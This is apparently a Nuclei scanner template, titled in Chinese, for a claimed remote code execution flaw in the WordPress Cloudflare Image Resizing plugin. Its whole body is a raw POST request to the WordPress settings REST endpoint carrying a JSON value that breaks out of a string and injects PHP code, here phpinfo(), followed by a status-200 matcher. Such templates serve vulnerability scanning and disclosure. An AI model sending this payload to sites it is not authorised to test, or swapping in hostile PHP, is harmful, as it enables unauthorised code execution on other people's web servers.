info:
  name: WordPress Cloudflare Image Resizing 插件存在前台代码执行漏洞(RCE)
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2025
http:
- raw:
  - 'POST /wp-json/wp/v2/settings/ HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Content-Type: application/json

    Content-Length: 46


    {"cf_image_resizing_fit": "''); phpinfo(); /*"}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
